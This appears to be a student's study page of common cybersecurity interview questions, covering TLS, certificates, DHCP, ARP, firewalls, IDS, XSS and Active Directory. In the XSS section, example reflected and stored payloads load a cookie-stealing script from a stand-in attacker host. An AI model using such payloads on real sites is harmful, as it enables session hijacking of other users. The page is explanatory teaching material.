@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>Common Cyber Security Interview Questions</title>
+    <meta name="description" content="Benwick&#39;s Website.">
+    <meta name="author" content='Benwick'><link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+        <link rel="icon" type="image/ico" href="https://benwick921.github.io/favicon.jpg">
+    
+</head>
+
+    <body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row p-0">
+        <a class="navbar-brand mr-sm-auto" href="https://benwick921.github.io">Cybersecurity Student</a>
+        <div class="navbar-nav flex-row">
+            
+                
+                
+                    <a class="nav-item nav-link" href="/resume">Resume</a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/blog">Blog</a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/resources">Resources</a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/contact">Contact</a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <h1> <span style="color:#da1953">Com</span>mon Cybersecurity Interview Questions </h1>
+<p>Oct 24, 2020</p>
+<p><span style="color:#da1953"><strong>DISCLAIMER: Informations are taken from varous resources such as Wikipedia, Youtube, university courses and many more.
+The page is frequently updated.</strong></span></p>
+<hr>
+<h2> <span style="color:#da1953">Ind</span>ex </h2>
+<ul>
+<li><a href="#TLS">TLS (Transport Layer Security)</a></li>
+<li><a href="#DIGCERT">Digital Certificates</a></li>
+<li><a href="#DHCP">DHCP Protocol</a></li>
+<li><a href="#ARP">ARP Protocol</a></li>
+<li><a href="#FIREWALL">Firewall</a></li>
+<li><a href="#IDS">IDS (Intrusion Detection System)</a></li>
+<li><a href="#XSS">XSS (Corss Site Scripting)</a></li>
+<li><a href="#ACTDIR">Active Directory</a></li>
+</ul>
+<hr>
+<h2 id=TLS> <span style="color:#da1953">TLS</span> (Transport Layer Security) </h2>
+<h3 id="introduction">Introduction</h3>
+<p>The protocols find widespread use in applications such as web browsing, email, instant messaging, and voice over IP (VoIP). Websites can use TLS to secure all communications between their servers and web browsers.</p>
+<p>The TLS protocol aims primarily to provide privacy and data integrity between two or more communicating computer applications. When secured by TLS, connections between a client and a server should have one or more of the following properties:</p>
+<ul>
+<li>The connection is private (or secure) because symmetric cryptography is used to	encrypt the data transmitted. The keys for this symmetric encryption are generated uniquely for each connection and are based on a shared secret that was negotiated at the start of the session (TLS handshake). The server and client negotiate the details of which encryption algorithm and cryptographic keys to use before the first byte of data is transmitted. The negotiation of a shared secret is both secure the negotiated secret is unavailable to eavesdroppers and cannot be obtained, even by an attacker who places themselves in the middle of the connection and reliable (no attacker can modify the communications during the negotiation without being detected).</li>
+<li>The identity of the communicating parties can be <em>authenticated</em> using public-key cryptography. This authentication can be made optional, but is generally required for at least one of the parties (typically the server).</li>
+<li>The connection is <em>reliable</em> because each message transmitted includes a message integrity check using a message authentication code to prevent undetected loss or alteration of the data during transmission.</li>
+<li>The TLS protocol comprises two layers: the TLS record and the TLS handshake protocols. TLS work in the application layer of TCP/IP model.</li>
+</ul>
+<p>The TLS protocol comprises two layers: the TLS record and the TLS handshake protocols. TLS work in the application layer of TCP/IP model.</p>
+<h3 id="digital-certificates">Digital Certificates</h3>
+<p>A digital certificate certifies the ownership of a public key by the named subject of the certificate, and indicates certain expected usages of that key. This allows others (relying parties) to rely upon signatures or on assertions made by the private key that corresponds to the certified public key.</p>
+<p>TLS typically relies on a set of trusted third-party certificate authorities to establish the authenticity of certificates.</p>
+<h3 id="tls-handshake">TLS Handshake</h3>
+<p>Step 1
+<img src="/interviewquestions/tls/step1.jpg" alt="step 1"></p>
+<p>The client sends its highest version of TLS, the available cryptographic algorithm and the data compression method that wants to use.</p>
+<p>Step2
+<img src="/interviewquestions/tls/step2.jpg" alt="step 2"></p>
+<p>The server chooses the highest cryptographic protocol available from the list provided by the client, its session ID and its digital certificate with which the client can encrypt a shared secret key for the symmetric cryptography.</p>
+<p>Step 3
+<img src="/interviewquestions/tls/step3.jpg" alt="step 3"></p>
+<p>The client verifies the authenticity of the certificate with the Certificate Authority.</p>
+<p>Step 4
+<img src="/interviewquestions/tls/step4.jpg" alt="step 4"></p>
+<p>In this way, only the Server can decrypt the secret key which will be used for future communications and data transfer.</p>
+<p>Step 5
+<img src="/interviewquestions/tls/step5.jpg" alt="step 5"></p>
+<p>The client is indication that his part of handshake is complete.</p>
+<p>Step 6
+<img src="/interviewquestions/tls/step6.jpg" alt="step 6"></p>
+<p>The server is indicating that his part of handshake is complete.</p>
+<p>Step 7
+<img src="/interviewquestions/tls/step7.jpg" alt="step 7"></p>
+<p>Now the client and server can exchange messages that are symmetrically encrypted.</p>
+<hr>
+<h2 id=DIGCERT> <span style="color:#da1953">Dig</span>ital Certificates </h2>
+<h3 id="introduction-1">Introduction</h3>
+<p>In cryptography, a certificate authority or certification authority (CA) is an entity that issues digital certificates. A digital certificate certifies the ownership of a public key by the named subject of the certificate. This allows others (relying parties) to rely upon signatures or on assertions made about the private key that corresponds to the certified public key. A CA acts as a trusted third party, trusted both by the subject (owner) of the certificate and by the party relying upon the certificate.</p>
+<p>In cryptography, a public key certificate, also known as a digital certificate or identity certificate, is an electronic document used to prove the ownership of a public key. The certificate includes information about the key, information about the identity of its owner (called the subject), and the digital signature of an entity that has verified the certificate&rsquo;s contents (called the issuer). If the signature is valid, and the software examining the certificate trusts the issuer, then it can use that key to communicate securely with the certificate&rsquo;s subject. In Transport Layer Security (TLS) a certificate&rsquo;s subject is typically a computer or other device, though TLS certificates may identify organizations or individuals in addition to their core role in identifying devices. TLS is notable for being a part of HTTPS, a protocol for securely browsing the web.</p>
+<p>In a typical public-key infrastructure (PKI) scheme, the certificate issuer is a certificate authority (CA), usually a company that charges customers to issue certificates for them. By contrast, in a web of trust scheme, individuals sign each other&rsquo;s keys directly, in a format that performs a similar function to a public key certificate.</p>
+<p><img src="/interviewquestions/digitalcertificate/certificatehierarchy.jpg" alt="Digital certificate hierarchy"></p>
+<hr>
+<h2 id=DHCP> <span style="color:#da1953">DHC</span>P Protocol </h2>
+<h3 id="introduction-2">Introduction</h3>
+<p>The Dynamic Host Configuration Protocol (DHCP) is a network management protocol used on Internet Protocol (IP) networks whereby a DHCP server dynamically assigns an IP address and other network configuration parameters to each device on a network so they can communicate with other IP networks. A DHCP server enables computers to request IP addresses and networking parameters automatically from the Internet service provider (ISP), reducing the need for a network administrator or a user to manually assign IP addresses to all network devices. In the absence of a DHCP server, a computer or other device on the network needs to be manually assigned an IP address, or to assign itself an APIPA address, which will not enable it to communicate outside its local subnet.</p>
+<p>DHCP can be implemented on networks ranging in size from home networks to large campus networks and regional Internet service provider networks. A router or a residential gateway can be enabled to act as a DHCP server.</p>
+<h3 id="overview">Overview</h3>
+<p>DHCP operates based on the client–server model. When a computer or other device connects to a network, the DHCP client software sends a DHCP broadcast query requesting the necessary information. Any DHCP server on the network may service the request. The DHCP server manages a pool of IP addresses and information about client configuration parameters such as default gateway, domain name, the name servers, and time servers. On receiving a DHCP request, the DHCP server may respond with specific information for each client, as previously configured by an 	administrator, or with a specific address and any other information valid for the entire network and for the time period for which the allocation (lease) is valid. A DHCP client typically queries for this information immediately after booting, and periodically thereafter before the expiration of the information. When a DHCP client refreshes an assignment, it initially requests the same parameter values, but the DHCP server may assign a new address based on the assignment policies set by administrators.</p>
+<p>Depending on implementation, the DHCP server may have three methods of allocating IP addresses:</p>
+<ul>
+<li>Dynamic allocation: A network administrator reserves a range of IP addresses for DHCP, and each DHCP client on the LAN is configured to request an IP address from the DHCP server during network initialization. The request-and-grant process uses a lease concept with a controllable time period, allowing the DHCP server to reclaim and then reallocate IP addresses that are not renewed.</li>
+<li>Automatic allocation: The DHCP server permanently assigns an IP address to a requesting client from the range defined by the administrator. This is like dynamic allocation, but the DHCP server keeps a table of past IP address assignments, so that it can preferentially assign to a client the same IP address that the client previously had.</li>
+<li>Manual Allocation: Also commonly called static allocation and reservations. The DHCP server issues a private IP address dependent upon each client&rsquo;s client id (or, traditionally, the client MAC address), based on a predefined mapping by the administrator. If no match for the client&rsquo;s client ID (if provided) or MAC address (if no client id is provided) is found, the server may or may not optionally fall back to either Dynamic or Automatic allocation.</li>
+</ul>
+<p>DHCP is used for Internet Protocol version 4 (IPv4) and IPv6.</p>
+<h3 id="operations">Operations</h3>
+<p>Step 1
+<img src="/interviewquestions/dhcp/step1.jpg" alt="Step 1"></p>
+<p>When client boots up it broadcast a DHCPDISCOVER message looking for a DHCP server note dstIP address.</p>
+<p>Step 2
+<img src="/interviewquestions/dhcp/step2.jpg" alt="Step 2"></p>
+<p>DHCPOFFER is a broadcast UDP packet and it replies with network configuration such as IP, lease time, DNS, subnet mask and default gateway, of course you can renew the lease when expired.</p>
+<p>Step 3
+<img src="/interviewquestions/dhcp/step3.jpg" alt="Step 3"></p>
+<p>DHCPREQUEST says that the client accepts the configurations sent by the Server.</p>
+<p>Step 4
+<img src="/interviewquestions/dhcp/step4.jpg" alt="Step 4"></p>
+<p>It is an acknowledgement packet to confirm that the server will registers client’s information.</p>
+<hr>
+<h2 id=ARP> <span style="color:#da1953">ARP</span> Protocol </h2>
+<h3 id="introduction-3">Introduction</h3>
+<p>The Address Resolution Protocol (ARP) is a communication protocol used for discovering the link layer address, such as a MAC address.</p>
+<p>Whenever a device needs to communicate with another device in a Local Area Network (LAN) it needs the MAC address for that device and devices use ARP protocol to acquire the MAC address for that device.</p>
+<p>An IP address is used to locate a device on a network and the MAC address is what identify the actual device.</p>
+<h3 id="operating-scope">Operating Scope</h3>
+<p>The Address Resolution Protocol is a request-response protocol whose messages are encapsulated by a link layer protocol. It is communicated within the boundaries of a single network, never routed across internetworking nodes.</p>
+<h3 id="arp-requestresponse">Arp Request/Response</h3>
+<p>An ARP probe is an ARP request broadcasted in to the LAN (also to the router) in search of the MAC address of a given IP and the host having the requested IP will send a response containing its MAC.</p>
+<h3 id="operations-1">Operations</h3>
+<p>Step 1
+<img src="/interviewquestions/arp/step1.jpg" alt="Step 1"></p>
+<p>The cliet sends a broadcast message because the destination MAC address is a broadcast address, simply saying anyone with IP address <em>192.168.1.50</em> if you hear me would you please give your packages, and here is my IP address and MAC address. The other devices will discard the ARP packet silently.</p>
+<p>Step 2
+<img src="/interviewquestions/arp/step2.jpg" alt="Step 2"></p>
+<p>When the server hear the message, it sends a unicast message to the client because the detination IP address and MAC address belong to the client.</p>
+<p>Step 3
+<img src="/interviewquestions/arp/step3.jpg" alt="Step 3"></p>
+<p>The client gets the server&rsquo;s MAC address and can sends the server a request. At the same time the client updates ARP cache tablesfor the future reference.</p>
+<hr>
+<h2 id=FIREWALL> <span style="color:#da1953">Fir</span>ewall </h2>
+<h3 id="network-layer-firewall-or-packet-filters">Network Layer Firewall or Packet Filters</h3>
+<p>Network layer firewalls, also called packet filters, operate at a relatively low level of the TCP/IP stack, blocking packets unless they match the established rule set. The firewall administrator may define the rules; or default rules may apply.</p>
+<p>Network layer firewalls generally fall into two sub-categories, stateful and stateless.</p>
+<p>A stateful firewall is a network firewall that tracks the operating state and characteristics of network connections traversing it. The firewall is configured to distinguish legitimate network packets for different types of connections. Only packets matching a known active connection are allowed to pass the firewall. In contrast a stateless firewall does not take context into account when determining whether to allow or block packets.</p>
+<p>There are other type of filters such as Application-Layer Firewall that filter preprocesses packets depending on the source/destination application, Proxies may act as a firewall by responding to input packets (connection requests, for example) in the manner of an application, while blocking other packets, Network Address Translation (NAT) may hide the true address of computer which is connected to the network.</p>
+<ul>
+<li>A firewall restrict access from outside</li>
+<li>Prevent attackers from getting too close</li>
+<li>Restrict people from leaving</li>
+</ul>
+<h3 id="packet-filters-stateless-firewall">Packet filters (stateless firewall)</h3>
+<ul>
+<li>Drop packets based on their source or destination addresses or port numbers or flags</li>
+<li>No context, only contents</li>
+<li>Can operate on
+<ul>
+<li>Incoming interface</li>
+<li>Outgoing interface</li>
+<li>Both</li>
+</ul>
+</li>
+<li>Check packets with fake IP addresses:
+<ul>
+<li>From outside (“ingress filtering”)</li>
+<li>From inside (“egress filtering”)</li>
+</ul>
+</li>
+</ul>
+<h3 id="problems-with-packet-filters">Problems with Packet Filters</h3>
+<ul>
+<li>Payload of TCP packet is not inspected.
+<ul>
+<li>No protection against attacks based on upper-layer vulnerabilities.</li>
+</ul>
+</li>
+<li>Limited logging ability (restricted to the few parameters used by the filter).</li>
+<li>No authentication facilities.</li>
+<li>Susceptible to attacks based on vulnerabilities in various implementations of TCP and/or IP.</li>
+</ul>
+<h3 id="stateful-packet-inspection">Stateful packet inspection</h3>
+<ul>
+<li>Stateful Inspection Firewalls (or Dynamic Packet Filters) can keep track of established connections.</li>
+<li>Can drop packets based on their source or destination IP addresses, port numbers and possibly TCP flags.
+<ul>
+<li>Solve one major problem of simple packet filters, since they can check that incoming traffic for a high-numbered port is a genuine response to a previous outgoing request to set up a connection.</li>
+</ul>
+</li>
+</ul>
+<p><img src="/interviewquestions/firewall/dynamicpacketfilter.jpg" alt="Dynamic packet filter"></p>
+<h3 id="common-firewall-weaknesses">Common firewall weaknesses</h3>
+<ul>
+<li>No content inspection causes the problems.
+<ul>
+<li>Software weakness (e.g. buffer overflow, and SQL injection exploits).</li>
+<li>Protocol weakness (WEP in 802.11).</li>
+</ul>
+</li>
+<li>No defense against.
+<ul>
+<li>Denial of service.</li>
+<li>Insider attacks.</li>
+</ul>
+</li>
+<li>Firewall failure has to be prevented.
+<ul>
+<li>Firewall cluster for redundancy.</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id=IDS> <span style="color:#da1953">IDS</span> (Intrusion Detection System) </h2>
+<p>An intrusion detection system (IDS) is a device or software application that monitors a network or systems for malicious activity.</p>
+<p>An Intrusion Detection System (IDS) aims at detecting the presence of intruders before serious damage is done.</p>
+<p>The ultimate purpose of an intruder could be to:</p>
+<ul>
+<li>Prevent the legitimate users from using the system.</li>
+<li>Reveal confidential information.</li>
+<li>Use the system as a stepping stone to attack other systems.</li>
+</ul>
+<p>Second generation IDS are IPS, Intrusion Prevention Systems, also produce responses to suspicious activity, for example, by modifying firewall rules or blocking switches ports.</p>
+<p><img src="/interviewquestions/ids/ids.jpg" alt="Ids"></p>
+<p>An IDS (passive detection) can only detect and rise alarm of malicious activities and report it to the network administrator or SIEM.</p>
+<h3 id="types-of-ids">Types of IDS</h3>
+<ul>
+<li>Host-based (HIDS):
+<ul>
+<li>Monitors events in a single host to detect suspicious activity.</li>
+<li>Typically deployed on critical hosts offering public services.</li>
+<li>Advantage: better visibility into behavior of individual applications running on the host.</li>
+</ul>
+</li>
+<li>Network-based (NIDS):
+<ul>
+<li>Analyses network, transport and application protocol activity.</li>
+<li>Often placed behind a router or firewall that is the entrance of a critical asset.</li>
+<li>Advantage: single NIDS/IPS can protect many hosts and detect global patterns.</li>
+</ul>
+</li>
+<li>Wireless (WIDS):
+<ul>
+<li>Analyses wireless networking protocol activity (not T- or A-layers).</li>
+<li>Typically deployed in or near an organization&rsquo;s wireless network.</li>
+</ul>
+</li>
+</ul>
+<h3 id="ids-detection-approach">IDS detection approach</h3>
+<ul>
+<li>Behavior-based (anomaly detection):
+<ul>
+<li>Define behavioral characteristics of normal behavior.</li>
+<li>Compare actual behavior with these. If there are significant differences, raise an alarm.</li>
+<li>Difficult to define all possible normal behavior. New activities often give &ldquo;false positives&rdquo; (i.e. normal behavior classified as intrusion).</li>
+</ul>
+</li>
+<li>Signature based (misuse detection):
+<ul>
+<li>Define characteristics of various types of abnormal activities.</li>
+<li>Compare actual behavior with these. If any of them match, raise alarm!.</li>
+<li>Difficult to produce a complete catalog of abnormal activities.
+<ul>
+<li>If any are missing, there will be &ldquo;false negatives&rdquo; (i.e. undetected intrusions)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="signature-based-ids">Signature-based IDS</h3>
+<ul>
+<li>Starts from the idea that intruders/attacks may have a characteristic appearance which makes it possible to identify them.</li>
+<li>The idea is to screen the PAYLOADS of the packets looking for specific patterns -&gt; no security signatures.</li>
+<li>Suppliers of IDSs maintain huge databases of signatures (code or data fragments) which characterize various classes of intruder.</li>
+<li>Rapid recognition involves searching for matches for one or more of the known signatures from a collection of many thousands of signatures</li>
+</ul>
+<h3 id="signature-based-ids-principles">Signature-based IDS principles</h3>
+<ul>
+<li>A packet sniffer on steroids.</li>
+<li>Passive capturer of the packets in a LAN, it can bring to bear on the packets some fairly complex logic to decide whether an intrusion has taken place
+<ul>
+<li>SNORT is one of the best-known intrusion detectors
+<ul>
+<li>Easy-to-learn and easy-to-use rule language for intrusion detection</li>
+<li>The rules are stored in /etc/snort/rules directory</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Con: can&rsquo;t inspect encrypted traffic (VPNs, SSL)</li>
+<li>Con: not all attacks arrive from the network</li>
+<li>Con: record and process huge amount of traffic</li>
+</ul>
+<hr>
+<h2 id=XSS> <span style="color:#da1953">XSS</span> (Cross Site Scripting) </h2>
+<h3 id="introduction-4">Introduction</h3>
+<p>It is a type of security vulnerability typically found in web applications. XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy.</p>
+<h3 id="examples">Examples</h3>
+<ul>
+<li>
+<p>Reflected: In a vulnerable website e query can be crafted in order to execute a custom script (<code>http://bobssite.org/search?q=puppies&lt;script%20src=&quot;http://mallorysevilsite.com/authstealer.js&quot;&gt;&lt;/script&gt;</code>) or encode the ASCII characters with percent-encoding, such as (<code>http://bobssite.org/search?q=puppies%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E</code>).
+If this link is sent to the victim he/she will execute the script <em>authstealer.js</em> and any operation written there can be executed such as stealing authentication cookies and log in as him/her.</p>
+</li>
+<li>
+<p>Stored: In this case the script is put in a text are or wherever a user can write such as comments of posts, review etc&hellip;
+If the site is vulnerable in the text are HTML commands can be execute so a proper XSS exploit can be crafted (<code>I love the puppies in this story! They're so cute!&lt;script src=&quot;http://mallorysevilsite.com/authstealer.js&quot;&gt;</code>). If the link is clicked the script <em>authstealer.js</em> will run and operations will be executed.</p>
+</li>
+</ul>
+<hr>
+<h2 id=ACTDIR> <span style="color:#da1953">Act</span>ive Directory </h2>
+<h3 id="introduction-5">Introduction</h3>
+<p>Active Directory (AD) is a directory service developed by Microsoft. A server running Active Directory Domain Service (AD DS) role is called a domain controller.  It authenticates and authorizes all users and computers in a Windows domain type network—assigning and enforcing security policies for all computers and installing or updating software. For example, when a user logs into a computer that is part of a Windows domain, Active Directory checks the submitted password and determines whether the user is a system administrator or normal user. Also, it allows management and storage of information and provides authentication and authorization mechanisms.</p>
+
+</div>
+
+        </div>
+    <div id="footer">
+        <hr>
+        <div class="container text-center mb-2">
+            <a href="https://github.com/benwick921"><small>Benwick</small></a>
+        </div>
+    </div>
+
+</body>
+</html>
